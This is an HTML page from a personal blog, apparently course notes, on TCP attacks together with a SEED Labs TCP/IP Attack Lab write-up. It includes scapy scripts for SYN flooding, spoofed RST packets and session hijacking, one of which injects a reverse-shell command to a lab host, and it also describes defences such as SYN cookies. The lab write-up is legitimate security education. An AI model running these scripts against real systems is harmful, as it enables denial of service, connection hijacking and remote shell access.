@@ -1,0 +1,533 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 7.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"always","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="网络攻防-假消息攻击2-TCP攻击，涉及实验：SEED Labs – TCP&#x2F;IP Attack Lab，代码见：https:&#x2F;&#x2F;github.com&#x2F;Seanxz401&#x2F;seed-labs">
+<meta property="og:type" content="article">
+<meta property="og:title" content="网络攻防-TCP攻击">
+<meta property="og:url" content="http://example.com/2022/12/31/university/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2-TCP%E6%94%BB%E5%87%BB/index.html">
+<meta property="og:site_name" content="Sean&#39;s Blog">
+<meta property="og:description" content="网络攻防-假消息攻击2-TCP攻击，涉及实验：SEED Labs – TCP&#x2F;IP Attack Lab，代码见：https:&#x2F;&#x2F;github.com&#x2F;Seanxz401&#x2F;seed-labs">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20221231152030964.png">
+<meta property="og:image" content="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20221231152310873.png">
+<meta property="og:image" content="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20221231153359564.png">
+<meta property="og:image" content="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20221231154243907.png">
+<meta property="og:image" content="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20221128162228311.png">
+<meta property="og:image" content="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20221128162526963.png">
+<meta property="og:image" content="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20221128163534578.png">
+<meta property="og:image" content="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20221128164013869.png">
+<meta property="og:image" content="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20221128170735641.png">
+<meta property="og:image" content="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20221128170947754.png">
+<meta property="og:image" content="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20221128180556451.png">
+<meta property="og:image" content="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20221128180718095.png">
+<meta property="og:image" content="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20221129150908375.png">
+<meta property="article:published_time" content="2022-12-31T07:44:19.000Z">
+<meta property="article:modified_time" content="2024-05-27T07:17:23.510Z">
+<meta property="article:author" content="Sean">
+<meta property="article:tag" content="网络安全 课程笔记">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20221231152030964.png">
+
+<link rel="canonical" href="http://example.com/2022/12/31/university/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2-TCP%E6%94%BB%E5%87%BB/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>网络攻防-TCP攻击 | Sean's Blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Sean's Blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/12/31/university/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2-TCP%E6%94%BB%E5%87%BB/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/banner.jpg">
+      <meta itemprop="name" content="Sean">
+      <meta itemprop="description" content="热爱可抵岁月漫长">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Sean's Blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          网络攻防-TCP攻击
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2022-12-31 15:44:19" itemprop="dateCreated datePublished" datetime="2022-12-31T15:44:19+08:00">2022-12-31</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2024-05-27 15:17:23" itemprop="dateModified" datetime="2024-05-27T15:17:23+08:00">2024-05-27</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/university/" itemprop="url" rel="index"><span itemprop="name">university</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/university/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2/" itemprop="url" rel="index"><span itemprop="name">网络攻防</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>网络攻防-假消息攻击2-TCP攻击，涉及实验：SEED Labs – TCP&#x2F;IP Attack Lab，代码见：<a target="_blank" rel="noopener" href="https://github.com/Seanxz401/seed-labs">https://github.com/Seanxz401/seed-labs</a></p>
+<span id="more"></span>
+
+<h1 id="理论"><a href="#理论" class="headerlink" title="理论"></a>理论</h1><p>传输控制协议（TCP）为应用程序提供主机到主机的通信服务。（可靠且有序）</p>
+<h2 id="TCP通信代码"><a href="#TCP通信代码" class="headerlink" title="TCP通信代码"></a>TCP通信代码</h2><p>客户端：1.创建套接字；2.设置目的地相关信息；3.连接目标服务器；4.发送数据</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> sockfd=socket(AF_INET,SOCK_STREAM,<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">dest</span>;</span></span><br><span class="line"><span class="built_in">memset</span>(&amp;dest,<span class="number">0</span>,<span class="keyword">sizeof</span>(<span class="keyword">struct</span> sockaddr_in));</span><br><span class="line">dest.sin_family=AF_INET;</span><br><span class="line">dest.sin_addr.s_addr=inet_addr(<span class="string">&quot;1.1.1.1&quot;</span>);</span><br><span class="line">dest.sin_port=htons(<span class="number">8080</span>);</span><br><span class="line">connect(sockfd,(<span class="keyword">struct</span> sockaddr*)&amp;dest,<span class="keyword">sizeof</span>(<span class="keyword">struct</span> sockaddr_in));</span><br><span class="line"><span class="type">char</span> *buf=<span class="string">&quot;hello&quot;</span>;</span><br><span class="line">write(sockfd,buf,<span class="built_in">strlen</span>(buf));</span><br></pre></td></tr></table></figure>
+
+<p>服务器端：1.创建套接字；2.绑定到端口；3.监听连接；4.接受连接请求；5.发送和接收数据</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> sockfd=socket(AF_INET,SOCK_STREAM,<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">myaddr</span>,<span class="title">client_addr</span>;</span></span><br><span class="line"><span class="built_in">memset</span>(&amp;myaddr,<span class="number">0</span>,<span class="keyword">sizeof</span>(<span class="keyword">struct</span> sockaddr_in));</span><br><span class="line">myaddr.sin_family=AF_INET;</span><br><span class="line">myaddr.sin_port=htons(<span class="number">8080</span>);</span><br><span class="line">bind(sockfd,(<span class="keyword">struct</span> sockaddr*)&amp;myaddr,<span class="keyword">sizeof</span>(<span class="keyword">struct</span> sockaddr_in));</span><br><span class="line">listen(sockfd,<span class="number">5</span>);</span><br><span class="line"><span class="type">int</span> client_len=<span class="keyword">sizeof</span>(client_addr);</span><br><span class="line">newsockfd=accept(sockfd,(<span class="keyword">struct</span> sockaddr*)&amp;client_addr,&amp;client_len);</span><br></pre></td></tr></table></figure>
+
+<p>要接受多个连接可以采用fork多进程、pthread多线程、select轮询等方法。以fork为例：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">    newsockfd=accept(sockfd,(<span class="keyword">struct</span> sockaddr*)&amp;client_addr,&amp;client_len);</span><br><span class="line">    <span class="keyword">if</span>(fork()==<span class="number">0</span>)&#123;</span><br><span class="line">        close(sockfd);</span><br><span class="line">        <span class="built_in">memset</span>(read_buf,<span class="number">0</span>,<span class="keyword">sizeof</span>(read_buf));</span><br><span class="line">        <span class="type">int</span> len=read(newsockfd,read_buf,<span class="number">100</span>);</span><br><span class="line">        close(newsockfd);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;ekse&#123;</span><br><span class="line">        close(newsockfd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="TCP报文"><a href="#TCP报文" class="headerlink" title="TCP报文"></a>TCP报文</h2><p><img src="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20221231152030964.png" alt="image-20221231152030964"></p>
+<ul>
+<li>seq序列号，如果设置了SYN位，则为初始序列号</li>
+<li>ack确认号，等于发送方期望的下一个序列号的值</li>
+</ul>
+<h2 id="TCP三次握手"><a href="#TCP三次握手" class="headerlink" title="TCP三次握手"></a>TCP三次握手</h2><img src="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20221231152310873.png" alt="image-20221231152310873" style="zoom:67%;" />
+
+<ol>
+<li>SYN包，客户端使用随机生成的数字x作为序列号</li>
+<li>SYN+ACK，服务器端使用随机生成的数字y作为序列号</li>
+<li>ACK，客户端确认，结束握手</li>
+</ol>
+<h2 id="SYN-Flooding"><a href="#SYN-Flooding" class="headerlink" title="SYN Flooding"></a>SYN Flooding</h2><p>当服务器接收到初始SYN数据包时，它使用TCB（传输控制块）存储有关连接的 信息。服务器将TCB存储在仅用于半开放连接的队列中。在服务器获得ACK数据包后，它将把这个TCB从队列中取出并存储在另一个地方 。如果ACK没有到达，服务器将重新发送SYN+ACK数据包。一段时间后，TCB最终将 被丢弃。</p>
+<p>攻击原理：持续向服务器发送大量 SYN数据包。这会通过插入TCB记录来消耗队列 中的空间。最终服务器端没有空间为任何新的半开放连接存储TCB，导致无法接收新的客户端连接请求。</p>
+<p>ps.使用随机的源IP</p>
+<p>防范：syncookies。在服务器接收到SYN数据包后，它使用只有服务器知道的密钥从数据包中的信息 计算密钥散列（H）。此哈希（H）作为初始序列号从服务器发送到客户端。服务器不会将半开放连接存储在其队列中。服务器通过重新计算cookie来检查确认字段中的数字是否有效。</p>
+<h2 id="TCP重置攻击"><a href="#TCP重置攻击" class="headerlink" title="TCP重置攻击"></a>TCP重置攻击</h2><p>断开TCP连接：</p>
+<ul>
+<li><p>FIN四次挥手</p>
+<img src="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20221231153359564.png" alt="image-20221231153359564" style="zoom:67%;" />
+</li>
+<li><p>RST：通信一方发送RST立刻断开连接</p>
+</li>
+</ul>
+<p>伪造RST数据包需要正确设置序列号和确认号</p>
+<h2 id="TCP会话劫持攻击"><a href="#TCP会话劫持攻击" class="headerlink" title="TCP会话劫持攻击"></a>TCP会话劫持攻击</h2><p>在已建立连接中注入数据。伪造数据包需要正确设置序列号和确认号，具体见实验。</p>
+<h3 id="反向shell"><a href="#反向shell" class="headerlink" title="反向shell"></a>反向shell</h3><p>劫持连接后运行的最佳命令是运行反向shell命令。<img src="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20221231154243907.png" alt="image-20221231154243907"></p>
+<h3 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h3><ul>
+<li>使攻击者难以伪造数据包<ul>
+<li>随机化源端口号</li>
+<li>随机化初始序列号</li>
+<li>对本地攻击无效</li>
+</ul>
+</li>
+<li>加密有效载荷</li>
+</ul>
+<h1 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h1><h2 id="Task1-SYN"><a href="#Task1-SYN" class="headerlink" title="Task1 SYN"></a>Task1 SYN</h2><h3 id="1-1-synflooding-py"><a href="#1-1-synflooding-py" class="headerlink" title="1.1 synflooding.py"></a>1.1 synflooding.py</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ipaddress <span class="keyword">import</span> IPv4Address</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> getrandbits</span><br><span class="line"></span><br><span class="line">ip=IP(dst=<span class="string">&#x27;10.9.0.5&#x27;</span>)</span><br><span class="line">tcp=TCP(dport=<span class="number">23</span>,flags=<span class="string">&#x27;S&#x27;</span>)</span><br><span class="line">pkt=ip/tcp</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">	pkt[IP].src=<span class="built_in">str</span>(IPv4Address(getrandbits(<span class="number">32</span>)))</span><br><span class="line">	pkt[TCP].sport = getrandbits(<span class="number">16</span>)</span><br><span class="line">	pkt[TCP].seq = getrandbits(<span class="number">32</span>)</span><br><span class="line">	send(pkt, verbose = <span class="number">0</span>)</span><br></pre></td></tr></table></figure>
+
+<p>以容器<code>10.9.0.5</code>的23端口作为目标，通过telnet判断是否成功。</p>
+<p>第一次尝试，容器中通过<code>netstat -nat</code>可以看到23端口收到了很多的SYN包，但是telnet远程登录还是成功了。</p>
+<p>改进1：提高受害者的tcp重传阈值</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sysctl -w net.ipv4.tcp_synack_retries=10</span><br></pre></td></tr></table></figure>
+
+<p>改进2：减小队列中能容纳的syn包的数量</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sysctl -w net.ipv4.tcp_max_syn_backlog=80</span><br></pre></td></tr></table></figure>
+
+<p>在容器中清除受害者与攻击者的成功连接记录：</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ip tcp_metrics show		<span class="comment">#查看</span></span><br><span class="line">ip tcp_metrics flush	<span class="comment">#刷新</span></span><br></pre></td></tr></table></figure>
+
+<p>再次发起攻击，等待一分钟后尝试登录，无法连接成功：<img src="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20221128162228311.png" alt="image-20221128162228311"></p>
+<p>查看受害者的队列中有多少个半连接：(前面设置的队列大小的四分之三用于存放半连接，三分之一用来存放已成功连接，因此有效容量为80*3&#x2F;4&#x3D;60)</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -tna | grep SYN_RECV | <span class="built_in">wc</span> -l</span><br></pre></td></tr></table></figure>
+
+<p>可以看出来队列已满<img src="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20221128162526963.png" alt="image-20221128162526963"></p>
+<h3 id="1-2-synflooding-c"><a href="#1-2-synflooding-c" class="headerlink" title="1.2 synflooding.c"></a>1.2 synflooding.c</h3><p>首先将受害者的相关参数恢复为修改前。</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sysctl -w net.ipv4.tcp_synack_retries=5</span><br><span class="line">sysctl -w net.ipv4.tcp_max_syn_backlog=128</span><br></pre></td></tr></table></figure>
+
+<p>编译执行synflood.c，等待一分钟后尝试telnet连接受害者，无法成功登录，查看半连接数量97&gt;(128*0.75&#x3D;96)：<img src="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20221128163534578.png" alt="image-20221128163534578"></p>
+<h3 id="1-3-syncookie"><a href="#1-3-syncookie" class="headerlink" title="1.3  syncookie"></a>1.3  syncookie</h3><p>开启syncookie保护机制，此机制能够检测syn洪水攻击</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sysctl -w net.ipv4.tcp_syncookies=1</span><br></pre></td></tr></table></figure>
+
+<p>开启syncookie后再次攻击，攻击无效，远程登录能成功。查看此时设置的队列值tcp_max_syn_backlog无效，因为连接并没有存在队列中。<a target="_blank" rel="noopener" href="https://www.cnblogs.com/silyvin/p/13596833.html">tcp_syncookies 半连接 - silyvin - 博客园 (cnblogs.com)</a><img src="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20221128164013869.png" alt="image-20221128164013869"></p>
+<h2 id="Task2-RST"><a href="#Task2-RST" class="headerlink" title="Task2 RST"></a>Task2 RST</h2><p>开启wireshark监听telnet包，用<code>10.9.0.5</code>向<code>10.9.0.6</code>发起telnet远程连接，成功登录后，查看最后一个telnet数据包，从中获取源IP、目的IP、源端口、目的端口、next seq等重要信息：<img src="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20221128170735641.png" alt="image-20221128170735641"></p>
+<p>根据这些信息构造RST包，伪装成上面那个最后一个telnet包的下一个包：</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ipaddress <span class="keyword">import</span> IPv4Address</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> getrandbits</span><br><span class="line"></span><br><span class="line">ip=IP(src=<span class="string">&#x27;10.9.0.6&#x27;</span>,dst=<span class="string">&#x27;10.9.0.5&#x27;</span>)</span><br><span class="line">tcp=TCP(sport=<span class="number">23</span>,dport=<span class="number">43322</span>,flags=<span class="string">&#x27;R&#x27;</span>,seq=<span class="number">2592535282</span>)</span><br><span class="line">pkt=ip/tcp</span><br><span class="line">ls(pkt)</span><br><span class="line">send(pkt, verbose = <span class="number">0</span>)</span><br></pre></td></tr></table></figure>
+
+<p>执行代码后查看连接已被中断，wireshark也捕获到了对应的RST包：<img src="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20221128170947754.png" alt="image-20221128170947754"></p>
+<h2 id="Task3-session-py"><a href="#Task3-session-py" class="headerlink" title="Task3  session.py"></a>Task3  session.py</h2><p>从远端(10.9.0.6)发来的最后一个telnet包中获得重要信息</p>
+<p><img src="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20221128180556451.png" alt="image-20221128180556451"></p>
+<p>攻击者假装是10.9.0.5在与10.9.0.6通信，seq和ack与上图中的交换，data中保存想要执行的命令，<strong>注意以\n\0结尾，\n表示回车执行，\0表示字符串结尾</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ipaddress <span class="keyword">import</span> IPv4Address</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> getrandbits</span><br><span class="line"></span><br><span class="line">ip=IP(src=<span class="string">&#x27;10.9.0.5&#x27;</span>,dst=<span class="string">&#x27;10.9.0.6&#x27;</span>)</span><br><span class="line">tcp=TCP(sport=<span class="number">43386</span>,dport=<span class="number">23</span>,flags=<span class="string">&#x27;A&#x27;</span>,seq=<span class="number">1725633516</span>,ack=<span class="number">1288303463</span>)</span><br><span class="line">data=<span class="string">&#x27;echo hackaaa\n\0&#x27;</span></span><br><span class="line">pkt=ip/tcp/data</span><br><span class="line">ls(pkt)</span><br><span class="line">send(pkt, verbose = <span class="number">0</span>)</span><br></pre></td></tr></table></figure>
+
+<p>wireshark抓到攻击者发出的会话劫持包，并成功接收到来自10.9.0.6的对应命令的回复，此时10.9.0.5的远程连接终端已经锁死。<img src="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20221128180718095.png" alt="image-20221128180718095"></p>
+<h2 id="Task4"><a href="#Task4" class="headerlink" title="Task4"></a>Task4</h2><p>大概过程与Task3类似，只是将传递的一条命令内容改为reverse shell。根据最后一个telnet包填充内容，代码：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ip=IP(src=<span class="string">&#x27;10.9.0.5&#x27;</span>,dst=<span class="string">&#x27;10.9.0.6&#x27;</span>)</span><br><span class="line">tcp=TCP(sport=<span class="number">43414</span>,dport=<span class="number">23</span>,flags=<span class="string">&#x27;A&#x27;</span>,seq=<span class="number">1895045313</span>,ack=<span class="number">3264741626</span>)</span><br><span class="line">data=<span class="string">&#x27;/bin/bash -i &gt; /dev/tcp/10.9.0.1/9090 0&lt;&amp;1 2&gt;&amp;1\n\0&#x27;</span></span><br><span class="line">pkt=ip/tcp/data</span><br><span class="line">ls(pkt)</span><br><span class="line">send(pkt, verbose = <span class="number">0</span>)</span><br></pre></td></tr></table></figure>
+
+<p>攻击机开启9090端口监听：</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lnv 9090</span><br></pre></td></tr></table></figure>
+
+<p>发送构造的包，成功获取到shell：<img src="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20221129150908375.png" alt="image-20221129150908375"></p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2022/12/31/university/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2-%E5%8C%85%E5%97%85%E6%8E%A2%E5%92%8C%E6%AC%BA%E9%AA%97/" rel="prev" title="网络攻防-包嗅探和欺骗">
+      <i class="fa fa-chevron-left"></i> 网络攻防-包嗅探和欺骗
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2022/12/31/university/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2-DNS%E6%94%BB%E5%87%BB/" rel="next" title="网络攻防-DNS攻击">
+      网络攻防-DNS攻击 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
